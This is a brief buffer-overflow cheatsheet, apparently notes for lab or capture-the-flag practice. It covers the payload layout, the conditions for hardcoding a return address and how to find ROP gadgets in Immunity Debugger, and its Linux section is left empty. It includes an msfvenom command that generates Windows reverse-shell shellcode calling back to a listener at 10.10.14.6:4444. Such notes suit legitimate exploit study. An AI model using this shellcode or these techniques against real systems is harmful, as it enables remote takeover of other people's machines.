# Buffer Overflow cheatsheet

## Generating Shellcode

```text
msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

## Payload Format

* payload = junk + shell\_addr + \(nops + shellcode\)
  * junk : is offset before the EIP overwritten.
  * shell\_addr : is the address which we overwrite on the EIP register.
  * \(nops + shellcode\) : actual shell code address, we need to include nops for smooth execution of shellcode. nops are part of shellcode

## Computing shell\_addr 

1\) Hardcoding shellcode address

* Requirements
  * We need ASLR disabled. address randomization for stack memory
  * We need no null byte in hardcoded address of \(nops + shellcode\).
  * We need the stack executable.

2\) If shellcode address contain null byte.

* We need to use ROP gadgets to solve it.
* Requirements
  * We need ASLR disabled. address randomization on stack
  * We need the stack executable.
  * ROP objects need to be present which do not have null byte in its address.

## Finding ROP in windows immunity debugger

* Right click on the command box -&gt; Search for -&gt; Sequence of commands

```text
POP ESP
POP ESP
RET
```

* "ctrl + l" to find the next search result.

## Finding ROP in linux

* 
